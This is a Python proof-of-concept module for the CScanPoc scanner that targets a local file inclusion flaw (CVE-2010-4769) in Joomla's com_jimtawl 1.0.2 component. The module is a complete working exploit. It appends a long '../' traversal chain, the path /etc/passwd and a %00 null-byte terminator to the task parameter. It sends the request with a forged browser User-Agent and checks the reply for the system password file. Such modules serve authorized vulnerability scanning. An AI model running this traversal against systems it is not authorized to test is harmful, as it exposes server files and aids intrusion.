# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0030'  # 平台漏洞编号
    # 漏洞名称
    name = 'Joomla Component (com_jimtawl) Local File Inclusion Vulnerability'
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2011-03-23'  # 漏洞公布时间
    desc = '''
        Joomla!的 Jimtawl（com_jimtawl）组件1.0.2版本中存在目录遍历漏洞。
        远程攻击者可以借助向index.php传递的task参数中的“..”操作符，
        读取任意文件或者可能引起其他未明影响。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-70258'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-4769'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = '1.0.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f5626d4a-2e9c-4e25-adb2-11f971ae844b'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 读取的文件名
            filename = '/etc/passwd'
            # 漏洞路径
            exploit = '/index.php?option=com_jimtawl&Itemid=12&task='
            # 截断符号
            dBs = '%00'
            # ..的个数
            dots = '../../../../../../../../../../../../../../..'
            # 漏洞利用地址
            vulurl = arg + exploit + dots + filename + dBs
            # 伪造的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 发送请求，并返回结果
            resp = requests.get(vulurl, headers=httphead, timeout=50)
            # 根据状态码和返回文件的内容，判断是否利用成功
            if resp.status_code == 200 and re.match('root:.+?:0:0:.+?:.+?:.+?', resp.text):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
